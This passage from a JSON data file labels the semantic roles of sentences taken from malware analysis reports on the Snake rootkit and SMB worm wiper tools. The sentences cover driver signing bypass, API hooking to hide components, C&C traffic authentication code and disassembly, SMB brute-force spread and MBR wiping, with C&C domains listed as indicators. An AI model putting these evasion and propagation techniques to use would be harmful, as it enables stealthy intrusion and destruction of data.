23</footer>\n\n\f\n<section>\n<heading>USERMODE DLLS</heading>\nThe usermode DLLs injected by the kernel-mode driver into the userland system process (e.g": {"injected": {"ARG0": {"text": "The usermode DLLs/ by the kernel - mode driver"}, "V": {"text": "injected", "index": 3}, "ARG2": {"text": "into the userland system process"}}}, " If the\ndata contains commands from C&C, the DLL module is expected to execute them and report results back to the driver to be\ndelivered back to C&C": {"contains": {"ARG0": {"text": "the data"}, "V": {"text": "contains", "index": 3}, "ARG1": {"text": "commands from C&C"}}, "is": {"V": {"text": "is", "index": 11}}, "expected": {"ARGM-ADV": {"text": "If the data contains commands from C&C"}, "V": {"text": "expected", "index": 12}, "ARG1": {"text": "to execute them and report results back to the driver to be delivered back to C&C"}}, "execute": {"ARG0": {"text": "the DLL module"}, "V": {"text": "execute", "index": 14}, "ARG1": {"text": "them"}}, "report": {"ARG0": {"text": "the DLL module"}, "V": {"text": "report", "index": 17}, "ARG1": {"text": "results back to the driver"}, "C-ARG1": {"text": "to be delivered back to C&C"}}, "be": {"V": {"text": "be", "index": 24}}, "delivered": {"V": {"text": "delivered", "index": 25}, "ARG2": {"text": "back to C&C"}}}, "\n\nWhen running in WinPE mode there is no Code Integrity control, therefore by enabling this mode by patching only one bit,\nCode Integrity verification is disabled so that the unsigned 64-bit driver can be loaded": {"running": {"ARGM-TMP": {"text": "When"}, "V": {"text": "running", "index": 1}, "ARG1": {"text": "in WinPE mode"}}, "is": {"ARGM-TMP": {"text": "When running in WinPE mode"}, "V": {"text": "is", "index": 6}, "ARG1": {"text": "no Code Integrity control"}}, "enabling": {"V": {"text": "enabling", "index": 14}, "ARG1": {"text": "this mode"}, "ARGM-MNR": {"text": "by patching only one bit"}}, "patching": {"V": {"text": "patching", "index": 18}, "ARG1": {"text": "only one bit"}}, "is_2": {"V": {"text": "is", "index": 26}}, "can": {"V": {"text": "can", "index": 34}}, "be": {"V": {"text": "be", "index": 35}}, "loaded": {"ARG2": {"text": "the unsigned 64-bit driver"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "loaded", "index": 36}}}, "\n\n\n\n</section>\n<section>\n<heading>\nNDIS HOOKING</heading>\nFor NDIS versions 5.X, Snake rootkit contains code that installs NDIS filter intermediate driver": {"contains": {"ARGM-ADV": {"text": "For NDIS versions 5.X"}, "ARG0": {"text": "Snake rootkit"}, "V": {"text": "contains", "index": 7}, "ARG1": {"text": "code that installs NDIS filter intermediate driver"}}, "installs": {"ARG0": {"text": "code"}, "R-ARG0": {"text": "that"}, "V": {"text": "installs", "index": 10}, "ARG1": {"text": "NDIS filter intermediate driver"}}}, "\n\n    2      As soon as the driver detects a usermode process that goes online (e.g": {"detects": {"ARG0": {"text": "the driver"}, "V": {"text": "detects", "index": 6}, "ARG1": {"text": "a usermode process that goes online ( e.g"}}, "goes": {"ARG1": {"text": "a usermode process"}, "R-ARG1": {"text": "that"}, "V": {"text": "goes", "index": 11}, "ARG4": {"text": "online ( e.g"}}}, "\n   03/02/2014        01:57 PM                    210,944 fdisk.sys\n   13/02/2014        04:47 PM              104,857,600 hotfix.dat\n                         2 File(s)          105,068,544 bytes\n                         2 Dir(s)        8,406,433,792 bytes free\n\n</figure>\nAnalysis of the hotfix.dat file contents reveals it\u2019s a fully encrypted file with flat entropy": {"reveals": {"V": {"text": "reveals", "index": 27}, "ARG1": {"text": "it \u2019s a fully encrypted file with flat entropy"}}, "encrypted": {"ARGM-EXT": {"text": "fully"}, "V": {"text": "encrypted", "index": 32}, "ARG1": {"text": "file"}}}, " The data stored in \\\\.\\Hd2 is encrypted the same way the first volume\u2019s data": {"stored": {"ARG1": {"text": "The data"}, "V": {"text": "stored", "index": 2}, "ARGM-ADV": {"text": "in \\\\.\\Hd2"}}, "is": {"V": {"text": "is", "index": 5}, "ARG2": {"text": "volume \u2019s data"}}, "encrypted": {"ARG1": {"text": "The data stored in \\\\.\\Hd2"}, "V": {"text": "encrypted", "index": 6}, "ARGM-MNR": {"text": "the same way the first volume \u2019s data"}}}, "\nThe attacker may then craft an exploit against those hosts, possibly by using the Metasploit framework, and then deliver the\ngenerated shellcode back to the reconnaissance tool to be applied against the identified hosts by running the tool with the\n\u2018exp_os\u2019 switch": {"may": {"V": {"text": "may", "index": 2}}, "craft": {"ARG0": {"text": "The attacker"}, "ARGM-MOD": {"text": "may"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "craft", "index": 4}, "ARG1": {"text": "an exploit against those hosts"}, "ARGM-MNR": {"text": "possibly by using the Metasploit framework"}}, "using": {"ARG0": {"text": "The"}, "V": {"text": "using", "index": 13}, "ARG1": {"text": "the Metasploit framework"}}, "deliver": {"ARG0": {"text": "The attacker"}, "ARGM-MOD": {"text": "may"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "deliver", "index": 20}, "ARG1": {"text": "the generated shellcode"}, "ARG2": {"text": "back to the reconnaissance tool to be applied against the identified hosts"}, "ARGM-MNR": {"text": "by running the tool with the \u2018 exp_os \u2019 switch"}}, "generated": {"V": {"text": "generated", "index": 22}, "ARG1": {"text": "shellcode"}}, "be": {"V": {"text": "be", "index": 30}}, "applied": {"ARG1": {"text": "the reconnaissance tool"}, "V": {"text": "applied", "index": 31}, "ARG2": {"text": "against the identified hosts"}}, "identified": {"V": {"text": "identified", "index": 34}}, "running": {"ARG0": {"text": "The attacker"}, "V": {"text": "running", "index": 37}, "ARG1": {"text": "the tool with the \u2018 exp_os \u2019 switch"}}}, " Firstly, the 64-bit unsigned driver file is created as usual:\n<list>\n     %windows%\\$NtUninstallQ817473$\\fdisk.sys\n</list>\nHowever, the driver is not registered; what is registered instead is the dropper itself": {"is": {"V": {"text": "is", "index": 7}}, "created": {"ARGM-TMP": {"text": "Firstly"}, "ARG1": {"text": "the 64-bit unsigned driver file"}, "V": {"text": "created", "index": 8}, "ARGM-MNR": {"text": "as usual"}}, "is_2": {"ARGM-DIS": {"text": "However"}, "ARG1": {"text": "the driver"}, "V": {"text": "is", "index": 16}, "ARGM-NEG": {"text": "not"}, "ARG2": {"text": "registered"}}, "registered": {"ARGM-DIS": {"text": "However"}, "ARG1": {"text": "the driver"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "registered", "index": 18}}, "is_3": {"ARG1": {"text": "what"}, "V": {"text": "is", "index": 21}, "ARG2": {"text": "registered"}, "ARGM-ADV": {"text": "instead"}}, "registered_2": {"ARG1": {"text": "what"}, "V": {"text": "registered", "index": 22}}, "is_4": {"ARG1": {"text": "what is registered"}, "ARGM-ADV": {"text": "instead"}, "V": {"text": "is", "index": 24}, "ARG2": {"text": "the dropper itself"}}}, "\n\nIn order to hide its components, the driver hooks the following APIs:\n<list>\n    \u2022\t ZwQueryKey\n    \u2022\t ZwEnumerateKey\n    \u2022\t ZwCreateKey\n    \u2022\t ZwSaveKey\n    \u2022\t ZwReadFile\n    \u2022\t ZwQuerySystemInformation\n    \u2022\t ZwQueryInformationProcess\n    \u2022\t ZwClose\n    \u2022\t ZwTerminateProcess\n    \u2022\t ZwShutdownSystem\n    \u2022\t ObOpenObjectByName\n</list>\n<footer>                                                                 BAE Systems Applied Intelligence: Snake Rootkit Report 2014           14</footer>\n\fFor example, the hook handlers of the registry-related APIs will block access to the registry entries that contain the name of the\ndriver": {"hide": {"V": {"text": "hide", "index": 3}, "ARG1": {"text": "its components"}}, "hooks": {"ARGM-PRP": {"text": "In order to hide its components"}, "ARG0": {"text": "the driver"}, "V": {"text": "hooks", "index": 9}, "ARG1": {"text": "the following APIs"}}, "following": {"V": {"text": "following", "index": 11}, "ARG1": {"text": "APIs"}}, "related": {"ARG2": {"text": "registry"}, "V": {"text": "related", "index": 24}, "ARG1": {"text": "APIs"}}, "will": {"ARGM-DIS": {"text": "For example"}, "ARG0": {"text": "the hook handlers of the registry - related APIs"}, "V": {"text": "will", "index": 26}, "ARG1": {"text": "block access to the registry entries that contain the name of the driver"}}, "block": {"ARGM-DIS": {"text": "For example"}, "ARG0": {"text": "the hook handlers of the registry - related APIs"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "block", "index": 27}, "ARG1": {"text": "access to the registry entries that contain the name of the driver"}}, "contain": {"ARG0": {"text": "the registry entries"}, "R-ARG0": {"text": "that"}, "V": {"text": "contain", "index": 34}, "ARG1": {"text": "the name of the driver"}}}, "\n</table>\n\nOnce decrypted, the malware interprets the received command, as reflected in the malware log below (the new C&C server address\nis highlighted in it):\n<list>\n    03:52:12 Del after 0\n    03:52:12 Run instruction: 6 ID:303149772147483647(13:41:34 05/08/2013)\n    03:52:12 Add address &marketplace.servehttp.com&/UPDATE/&cert1024&Un77ko#s&&&\n    03:52:12 Finish run instruction": {}, " Some examples are given below, and\na full list of known domains is given in the Appendix D:\n<list>\n      \u2022\t north-area.bbsindex.com\n      \u2022\t winter.site11.com\n      \u2022\t swim.onlinewebshop.net\n      \u2022\t july.mypressonline.com\n      \u2022\t toolsthem.xp3.biz\n      \u2022\t softprog.freeoda.com\n      \u2022\t euassociate.6te.net\n</list>\nAs seen in the traffic dump above, the malware first resolves the domain name of its C&C": {"are": {"V": {"text": "are", "index": 2}}, "given": {"ARG1": {"text": "Some examples"}, "V": {"text": "given", "index": 3}, "ARGM-LOC": {"text": "below"}}, "known": {"V": {"text": "known", "index": 11}, "ARG1": {"text": "domains"}}, "is": {"V": {"text": "is", "index": 13}}, "given_2": {"ARG1": {"text": "a full list of known domains"}, "V": {"text": "given", "index": 14}, "ARGM-LOC": {"text": "in the Appendix D"}}, "seen": {"V": {"text": "seen", "index": 21}, "ARGM-LOC": {"text": "in the traffic dump above"}}, "resolves": {"ARGM-ADV": {"text": "As seen in the traffic dump above"}, "ARG0": {"text": "the malware"}, "ARGM-TMP": {"text": "first"}, "V": {"text": "resolves", "index": 31}, "ARG1": {"text": "the domain name of its C&C"}}}, " The choice of what architecture should be used may depend on a specific\ntarget\u2019s environment, allowing the Snake operators to choose the most suitable architecture to be deployed": {"should": {"V": {"text": "should", "index": 5}}, "be": {"V": {"text": "be", "index": 6}}, "used": {"ARG1": {"text": "what architecture"}, "ARGM-MOD": {"text": "should"}, "V": {"text": "used", "index": 7}}, "may": {"ARG1": {"text": "The choice of what architecture should be used"}, "V": {"text": "may", "index": 8}, "ARG2": {"text": "on a specific target \u2019s environment"}, "ARGM-ADV": {"text": "allowing the Snake operators to choose the most suitable architecture to be deployed"}}, "depend": {"ARG0": {"text": "The choice of what architecture should be used"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "depend", "index": 9}, "ARG1": {"text": "on a specific target \u2019s environment"}, "ARGM-ADV": {"text": "allowing the Snake operators to choose the most suitable architecture to be deployed"}}, "allowing": {"V": {"text": "allowing", "index": 17}, "ARG1": {"text": "the Snake operators to choose the most suitable architecture to be deployed"}}, "choose": {"ARG0": {"text": "the Snake operators"}, "V": {"text": "choose", "index": 22}, "ARG1": {"text": "the most suitable architecture to be deployed"}}, "be_2": {"V": {"text": "be", "index": 28}}, "deployed": {"ARG1": {"text": "the most suitable architecture"}, "V": {"text": "deployed", "index": 29}}}, "\n\nHere are specific steps:\n<list>\n    \u2022\t   The data it accepts should start from a 10 byte signature with the following rules:\n\n         \u2022\t     the first 8 bytes must all be ASCII characters, the parser calculates their total sum (sum):\n<code>\n                 01         for (int i = 0; i < 8; i++)\n                 02         {\n                 03         \t      if (*(BYTE *)ptrBuffer <= 32 ||\n                 04         \t          *(BYTE *)ptrBuffer >= 128)\n                 05         \t{\n                 06         \t\treturn 0;                                           // if not ASCII, quit\n                 07         \t}\n                 08         \t      sum += *(BYTE *)ptrBuffer;                    // add to sum\n                 09         \t      ++ptrBuffer;                                  // advance buffer pointer\n                 10         }\n</code>\n\n         \u2022\t     9th byte must be equal to sum / 26 + 65\n\n         \u2022\t     10th byte must be equal to 122 - sum % 26\n<code>\n\n                 01         if ((*(BYTE *)ptrBuffer != sum / 26 + 65) ||\n                 02             (*(BYTE *)(ptrBuffer + 1) != 122 - sum % 26))\n                 03         {\n                 04                result = 0;\n                 05         }\n</code>\n   \u2022\t    Starting from the 11th byte, the data must be base64-encoded; the parser decodes that data\n<code>\n           01          base_64_decode(abyBuffer + 10,\n           02                         &ptrDecoded,\n           03                         iMaxLength - 10);\n</code>\n\n    \u2022\t   Once decoded, the decrypted data should contain the aforementioned markers:\n<figure>\n          .text:F6751426              lea          eax, [ebp+dwMarker]                            ; return marker here\n          .text:F6751429              push         eax\n          .text:F675142A              mov          ecx, [ebp+buf_len]                             ; traffic\u2019s buffer length\n          .text:F675142D              push         ecx\n          .text:F675142E              mov          edx, [ebp+abyBuffer]                           ; traffic\u2019s buffer pointer\n          .text:F6751431              push         edx\n          .text:F6751432              call         decrypt_traffic                                ; decrypt traffic first\n          .text:F6751437              test         eax, eax\n          .text:F6751439              jz           short exit                                     ;   if failed, exit\n          .text:F675143B              mov          eax, [ebp+dwMarker]                            ;   check the returned marker\n          .text:F675143E              cmp          eax, _DEADBEAF                                 ;   _DEADBEAF dd 0DEADBEAFh\n          .text:F6751444              jnz          short exit                                     ;   if not 0xDEADBEAF, exit\n          .text:F6751446              cmp          [ebp+dwNextDword], 0C001BA5Eh                  ;   check next DWORD\n          .text:F675144D              jnz          short next                                     ;   if not 0xC001BA5E, exit\n</figure>\n\n   \u2022\t    When the traffic is authenticated, its contents is then parsed by using \u201cGET\u201d, \u201cPOST\u201d, \u201chttp://\u201d, \u201cHTTP/\u201d,\n         \u201cContent-Length\u201d, \u201cConnection\u201d, \u201cclose\u201d tags, in order to retrieve HTTP requests\n\n   \u2022\t    SMTP traffic is also parsed, only by using \u201cMAIL \u201c, \u201cRCPT \u201c tags in order to retrieve SMTP characteristics\n</list>\n\n\n         <footer>                                                 BAE Systems Applied Intelligence: Snake Rootkit Report 2014   18</footer>\n\fBy observing such behaviour, one might wonder why the driver is expecting HTTP or SMTP clients? Why does it act like HTTP/SMTP\nserver processing client traffic, and serving back normal responses as per the protocol?\n\nFor example, in HTTP the driver will respond with messages like \u201cHTTP/1.1 200 OK\u201d or \u201cHTTP/1.1 500 Server Error\u201d": {"are": {"ARG2": {"text": "Here"}, "V": {"text": "are", "index": 1}, "ARG1": {"text": "specific steps"}}, "observing": {"V": {"text": "observing", "index": 6}, "ARG1": {"text": "such behaviour"}}, "might": {"V": {"text": "might", "index": 11}}, "wonder": {"ARGM-MNR": {"text": "By observing such behaviour"}, "ARG0": {"text": "one"}, "ARGM-MOD": {"text": "might"}, "V": {"text": "wonder", "index": 12}, "ARG1": {"text": "why the driver is expecting HTTP or SMTP clients ? Why does it act like HTTP / SMTP server processing client traffic , and serving back normal responses as per the protocol ? For example , in HTTP the driver will respond with messages like \u201c HTTP/1.1 200 OK \u201d or \u201c HTTP/1.1 500 Server Error \u201d"}}, "is": {"V": {"text": "is", "index": 16}}, "expecting": {"ARGM-CAU": {"text": "why"}, "ARG0": {"text": "the driver"}, "V": {"text": "expecting", "index": 17}, "ARG1": {"text": "HTTP or SMTP clients"}}, "does": {"V": {"text": "does", "index": 24}}, "act": {"ARGM-CAU": {"text": "Why"}, "ARG0": {"text": "it"}, "V": {"text": "act", "index": 26}, "ARGM-MNR": {"text": "like HTTP / SMTP server processing client traffic"}}, "processing": {"V": {"text": "processing", "index": 32}, "ARG1": {"text": "client traffic"}}, "serving": {"ARGM-PRP": {"text": "Why/ in HTTP the driver"}, "ARG0": {"text": "it"}, "V": {"text": "serving", "index": 37}, "ARG1": {"text": "back/ normal responses"}, "ARGM-PRD": {"text": "as per the protocol"}}, "will": {"ARG2": {"text": "in HTTP"}, "ARG0": {"text": "the driver"}, "V": {"text": "will", "index": 53}, "ARG1": {"text": "respond"}}, "respond": {"ARGM-PRP": {"text": "in HTTP"}, "ARG0": {"text": "the driver"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "respond", "index": 54}, "ARG1": {"text": "with messages like \u201c HTTP/1.1 200 OK \u201d"}}, "HTTP/1.1": {"V": {"text": "HTTP/1.1", "index": 59}, "ARG1": {"text": "200 OK"}}}, " If the device name is Null, Beep, tcpip or Nsiproxy, it will activate\nitself by enabling its hooks designed to hide the presence of Snake on a system, set up its access control lists and the messaging\nsystem": {"is": {"ARG1": {"text": "the device name"}, "V": {"text": "is", "index": 4}, "ARG2": {"text": "Null , Beep , tcpip or Nsiproxy"}}, "will": {"ARGM-ADV": {"text": "If the device name is Null , Beep , tcpip or Nsiproxy"}, "ARG0": {"text": "it"}, "V": {"text": "will", "index": 14}, "ARG1": {"text": "activate itself"}, "ARGM-MNR": {"text": "by enabling its hooks designed to hide the presence of Snake on a system , set up its access control lists and the messaging system"}}, "activate": {"ARGM-ADV": {"text": "If the device name is Null , Beep , tcpip or Nsiproxy"}, "ARG0": {"text": "it"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "activate", "index": 15}, "ARG1": {"text": "itself"}, "ARGM-MNR": {"text": "by enabling its hooks designed to hide the presence of Snake on a system , set up its access control lists and the messaging system"}}, "enabling": {"V": {"text": "enabling", "index": 18}, "ARG1": {"text": "its hooks designed to hide the presence of Snake on a system , set up its access control lists and the messaging system"}}, "designed": {"ARG1": {"text": "its hooks"}, "V": {"text": "designed", "index": 21}, "ARG3": {"text": "to hide the presence of Snake on a system , set up its access control lists and the messaging system"}}, "hide": {"V": {"text": "hide", "index": 23}, "ARG1": {"text": "the presence of Snake on a system , set up its access control lists and the messaging system"}}, "set": {"V": {"text": "set", "index": 32}, "ARG1": {"text": "its access control lists and the messaging system"}}}, "\nWhen the dropper file was executed, it started a second instance of itself with \u201c-i\u201d as an argument, and then terminated": {"was": {"V": {"text": "was", "index": 4}}, "executed": {"ARGM-TMP": {"text": "When"}, "ARG1": {"text": "the dropper file"}, "V": {"text": "executed", "index": 5}}, "started": {"ARGM-TMP": {"text": "When the dropper file was executed"}, "ARG0": {"text": "it"}, "V": {"text": "started", "index": 8}, "ARG1": {"text": "a second instance of itself with \u201c -i \u201d"}, "ARG2": {"text": "as an argument"}}, "terminated": {"ARGM-TMP": {"text": "When the dropper file was executed/ then"}, "ARG0": {"text": "it"}, "V": {"text": "terminated", "index": 24}}}, " This further results in the\nvictim machine being non-operational with irrecoverable data": {"results": {"ARG1": {"text": "This"}, "ARGM-EXT": {"text": "further"}, "V": {"text": "results", "index": 2}, "ARG2": {"text": "in the victim machine being non - operational with irrecoverable data"}}, "being": {"V": {"text": "being", "index": 7}, "ARG2": {"text": "non - operational"}, "ARGM-MNR": {"text": "with irrecoverable data"}}}, " This SMB Worm Tool is equipped with a Listening Implant, Lightweight Backdoor, Proxy Tool,\nDestructive Hard Drive Tool, and Destructive Target Cleaning Tool": {"is": {"V": {"text": "is", "index": 4}}, "equipped": {"ARG1": {"text": "This SMB Worm Tool"}, "V": {"text": "equipped", "index": 5}, "ARG2": {"text": "with a Listening Implant , Lightweight Backdoor , Proxy Tool , Destructive Hard Drive Tool , and Destructive Target Cleaning Tool"}}}, " The tool is dropped and installed by another\nexecutable and consists of three parts: an executable and a dll which contain the destructive components, and an encoded command file that contains the actual\ndestruction commands to be executed": {"is": {"V": {"text": "is", "index": 2}}, "dropped": {"ARG1": {"text": "The tool"}, "V": {"text": "dropped", "index": 3}, "ARG0": {"text": "by another executable"}}, "installed": {"ARG1": {"text": "The tool"}, "V": {"text": "installed", "index": 5}, "ARG0": {"text": "by another executable"}}, "consists": {"ARG1": {"text": "The tool"}, "V": {"text": "consists", "index": 10}, "ARG2": {"text": "of three parts : an executable and a dll which contain the destructive components , and an encoded command file that contains the actual destruction commands to be executed"}}, "contain": {"ARG0": {"text": "a dll"}, "R-ARG0": {"text": "which"}, "V": {"text": "contain", "index": 21}, "ARG1": {"text": "the destructive components"}}, "encoded": {"V": {"text": "encoded", "index": 28}, "ARG1": {"text": "command"}}, "contains": {"ARG0": {"text": "an encoded command file"}, "R-ARG0": {"text": "that"}, "V": {"text": "contains", "index": 32}, "ARG1": {"text": "the actual destruction commands to be executed"}}, "be": {"V": {"text": "be", "index": 38}}, "executed": {"ARG1": {"text": "the actual destruction commands"}, "V": {"text": "executed", "index": 39}}}, " If \u201cigfxtrayex.exe\u201d is run with no parameters, it creates and starts a copy of itself with\nthe \u201c\u2013i\u201d argument": {"is": {"V": {"text": "is", "index": 4}}, "run": {"ARG1": {"text": "igfxtrayex.exe \u201d"}, "V": {"text": "run", "index": 5}, "ARGM-MNR": {"text": "with no parameters"}}, "creates": {"ARGM-ADV": {"text": "If \u201c igfxtrayex.exe \u201d is run with no parameters"}, "ARG0": {"text": "it"}, "V": {"text": "creates", "index": 11}, "ARG1": {"text": "a copy of itself with the \u201c \u2013i \u201d"}}, "starts": {"ARGM-ADV": {"text": "If \u201c igfxtrayex.exe \u201d is run with no parameters"}, "ARG0": {"text": "it"}, "V": {"text": "starts", "index": 13}, "ARG1": {"text": "a copy of itself"}, "ARG2": {"text": "with the \u201c \u2013i \u201d argument"}}}, " There are two main threads: the first thread calls home and sends back logs (a list of successful SMB exploitations), and the second thread\nattempts to guess passwords for SMB connections": {"are": {"V": {"text": "are", "index": 1}, "ARG1": {"text": "two main threads : the first thread calls home and sends back logs ( a list of successful SMB exploitations ) , and the second thread attempts to guess passwords for SMB connections"}}, "calls": {"ARG1": {"text": "the first thread"}, "V": {"text": "calls", "index": 9}, "ARG2": {"text": "home"}}, "sends": {"ARG0": {"text": "the first thread"}, "V": {"text": "sends", "index": 12}, "ARGM-DIR": {"text": "back"}, "ARG1": {"text": "logs ( a list of successful SMB exploitations )"}}, "attempts": {"ARG0": {"text": "the second thread"}, "V": {"text": "attempts", "index": 28}, "ARG1": {"text": "to guess passwords for SMB connections"}}, "guess": {"V": {"text": "guess", "index": 30}, "ARG1": {"text": "passwords for SMB connections"}}}, " Upon initial connection, the victim sends the string, \"HTTP/1.1 GET /dns?\n\\x00.\" The controller then responds with the string \"200 www.yahoo.com!\\x00\" (for \"sensvc.exe\" and \"msensvc.exe\") or with the string \"RESPONSE 200 OK!!\" (for\n\"netcfg.dll\")": {"sends": {"ARGM-TMP": {"text": "Upon initial connection"}, "ARG0": {"text": "the victim"}, "V": {"text": "sends", "index": 6}, "ARG1": {"text": "the string , \" HTTP/1.1 GET /dns ? \\x00 . \" The controller then responds with the string \" 200 www.yahoo.com!\\x00 \" ( for \" sensvc.exe \" and \" msensvc.exe \" ) or with the string \" RESPONSE 200 OK/ ( for \" netcfg.dll"}}, "GET": {"ARG1": {"text": "\"/ HTTP/1.1"}, "V": {"text": "GET", "index": 12}}, "responds": {"ARG0": {"text": "The controller"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "responds", "index": 21}, "ARG1": {"text": "with the string \" 200 www.yahoo.com!\\x00"}}}, " This\ntool includes functionality to open ports in a victim host's firewall and take advantage of universal Plug and Play (UPNP) mechanisms to discover routers and\ngateway devices, and add port mappings, allowing inbound connections to victim hosts on Network Address Translated (NAT) private networks": {"includes": {"ARG2": {"text": "This tool"}, "V": {"text": "includes", "index": 2}, "ARG1": {"text": "functionality to open ports in a victim host 's firewall and take advantage of universal Plug and Play ( UPNP ) mechanisms to discover routers and gateway devices , and add port mappings , allowing inbound connections to victim hosts on Network Address Translated ( NAT ) private networks"}}, "open": {"V": {"text": "open", "index": 5}, "ARG1": {"text": "ports"}, "ARGM-LOC": {"text": "in a victim host 's firewall"}}, "take": {"ARG0": {"text": "This tool"}, "V": {"text": "take", "index": 14}, "ARG1": {"text": "advantage"}, "ARG2": {"text": "of universal Plug"}}, "discover": {"V": {"text": "discover", "index": 26}, "ARG1": {"text": "routers and gateway devices"}}, "add": {"V": {"text": "add", "index": 33}, "ARG1": {"text": "port mappings"}, "ARGM-ADV": {"text": "allowing inbound connections to victim hosts on Network Address Translated ( NAT ) private networks"}}, "allowing": {"V": {"text": "allowing", "index": 37}, "ARG1": {"text": "inbound connections to victim hosts on Network Address Translated ("}}, "victim": {"V": {"text": "victim", "index": 41}, "ARG1": {"text": "hosts"}}}, " This proxy tool has basic backdoor functionality, including the ability to fingerprint the\nvictim machine, run remote commands, perform directory listings, perform process listings, and transfer files": {"has": {"ARG0": {"text": "This proxy tool"}, "V": {"text": "has", "index": 3}, "ARG1": {"text": "basic backdoor functionality , including the ability to fingerprint the victim machine , run remote commands , perform directory listings , perform process listings , and transfer files"}}, "including": {"ARG2": {"text": "basic backdoor functionality"}, "V": {"text": "including", "index": 8}, "ARG1": {"text": "the ability to fingerprint the victim machine , run remote commands , perform directory listings , perform process listings , and transfer files"}}, "fingerprint": {"V": {"text": "fingerprint", "index": 12}, "ARG1": {"text": "the victim machine"}}, "run": {"V": {"text": "run", "index": 17}, "ARG1": {"text": "remote commands"}}, "perform": {"ARG0": {"text": "This proxy tool"}, "V": {"text": "perform", "index": 21}, "ARG1": {"text": "directory listings"}}, "perform_2": {"ARG0": {"text": "This proxy tool"}, "V": {"text": "perform", "index": 25}, "ARG1": {"text": "process listings"}}, "transfer": {"V": {"text": "transfer", "index": 30}, "ARG1": {"text": "files"}}}, "\n\nDestructive Target Cleaning Tool: This tool renders victim machines inoperable by overwriting the Master Boot Record": {"renders": {"ARG0": {"text": "This tool"}, "V": {"text": "renders", "index": 7}, "ARG1": {"text": "victim machines/ inoperable"}, "ARG2": {"text": "by overwriting the Master Boot Record"}}, "overwriting": {"ARG0": {"text": "This tool renders"}, "V": {"text": "overwriting", "index": 12}, "ARG1": {"text": "the Master Boot Record"}}}, "\n\nNetwork Propagation Wiper: The malware has the ability to propagate throughout the target network via built-in Windows shares": {"has": {"ARG0": {"text": "The malware"}, "V": {"text": "has", "index": 6}, "ARG1": {"text": "the ability to propagate throughout the target network via built - in Windows shares"}}, "propagate": {"ARG0": {"text": "Network Propagation Wiper"}, "V": {"text": "propagate", "index": 10}, "ARGM-LOC": {"text": "throughout the target network"}, "ARGM-MNR": {"text": "via built - in Windows shares"}}, "built": {"V": {"text": "built", "index": 16}, "ARG1": {"text": "in Windows shares"}}}, " Once the wiper has been uploaded, the malware reports its status back to one of\nthe four C2 IP addresses": {"has": {"V": {"text": "has", "index": 3}}, "been": {"V": {"text": "been", "index": 4}}, "uploaded": {"ARG1": {"text": "the wiper"}, "V": {"text": "uploaded", "index": 5}}, "reports": {"ARGM-TMP": {"text": "Once the wiper has been uploaded"}, "ARG0": {"text": "the malware"}, "V": {"text": "reports", "index": 9}, "ARG1": {"text": "its status"}, "ARG2": {"text": "back/ to one of the four C2 IP addresses"}}, "addresses": {"ARG1": {"text": "the four C2 IP"}, "V": {"text": "addresses", "index": 20}}}, "\n\nThe SMB worm propagates throughout an infected network via brute-force authentication attacks, and connects to a C2 infrastructure": {"propagates": {"ARG0": {"text": "The SMB worm"}, "V": {"text": "propagates", "index": 3}, "ARGM-LOC": {"text": "throughout an infected network"}, "ARGM-MNR": {"text": "via brute - force authentication attacks"}}}, " The \u201c-s\u201d instance dropped and executed\n\u201cigfxtrayex.exe\u201d, created \u201cnet_ver.dat\u201d, and began generating network traffic over TCP ports 445 and 139 to victim IP addresses": {"dropped": {"ARG1": {"text": "The \u201c -s \u201d instance"}, "V": {"text": "dropped", "index": 5}}, "executed": {"ARG0": {"text": "The \u201c -s \u201d instance"}, "V": {"text": "executed", "index": 7}, "ARG1": {"text": "\u201c igfxtrayex.exe"}}, "created": {"ARG0": {"text": "The \u201c -s \u201d instance"}, "V": {"text": "created", "index": 12}, "ARG1": {"text": "\u201c net_ver.dat \u201d"}}, "began": {"V": {"text": "began", "index": 18}, "ARG1": {"text": "generating network traffic over TCP ports 445 and 139 to victim IP addresses"}}, "generating": {"V": {"text": "generating", "index": 19}, "ARG1": {"text": "network traffic over TCP ports 445 and 139"}, "ARGM-PRP": {"text": "to victim IP addresses"}}, "victim": {"V": {"text": "victim", "index": 29}, "ARG1": {"text": "IP addresses"}}}, " It is dropped from resource ID 0x83 of \u201cigfxtrayex.exe\u201d": {"is": {"V": {"text": "is", "index": 1}}, "dropped": {"ARG1": {"text": "It"}, "V": {"text": "dropped", "index": 2}, "ARG2": {"text": "from resource ID 0x83 of \u201c"}}}, " It includes functionality such as file transfer, system survey, process\nmanipulation, file time matching and proxy capability": {"includes": {"ARG2": {"text": "It"}, "V": {"text": "includes", "index": 1}, "ARG1": {"text": "functionality such as file transfer , system survey , process manipulation , file time matching and proxy capability"}}}, " If the password is correctly guessed, a file share is established and file is copied and run on the newly-infected\nhost": {"is": {"ARG1": {"text": "the password"}, "V": {"text": "is", "index": 3}, "ARG2": {"text": "correctly guessed"}}, "guessed": {"ARG1": {"text": "the password"}, "ARGM-MNR": {"text": "correctly"}, "V": {"text": "guessed", "index": 5}}, "is_2": {"V": {"text": "is", "index": 10}}, "established": {"ARGM-ADV": {"text": "If the password is correctly guessed"}, "ARG1": {"text": "a file share"}, "V": {"text": "established", "index": 11}}, "is_3": {"ARG1": {"text": "file"}, "V": {"text": "is", "index": 14}, "ARG2": {"text": "copied"}}, "copied": {"ARG1": {"text": "file"}, "V": {"text": "copied", "index": 15}, "ARGM-LOC": {"text": "on the newly - infected host"}}, "run": {"ARG1": {"text": "file"}, "V": {"text": "run", "index": 17}, "ARGM-LOC": {"text": "on the newly - infected host"}}, "infected": {"ARGM-TMP": {"text": "newly"}, "V": {"text": "infected", "index": 22}, "ARG1": {"text": "host"}}}, "\n\nProxy Tool: Implants in this malware family are typically loaded via a dropper installed as a service, then configured to listen on TCP port 443": {"are": {"V": {"text": "are", "index": 8}}, "loaded": {"ARG1": {"text": "Implants in this malware family"}, "ARGM-ADV": {"text": "typically"}, "V": {"text": "loaded", "index": 10}, "ARGM-MNR": {"text": "via a dropper installed"}, "ARG2": {"text": "as a service , then configured to listen on TCP port 443"}}, "installed": {"ARG1": {"text": "a dropper"}, "V": {"text": "installed", "index": 14}, "ARG2": {"text": "as a service"}}, "configured": {"ARGM-TMP": {"text": "then"}, "V": {"text": 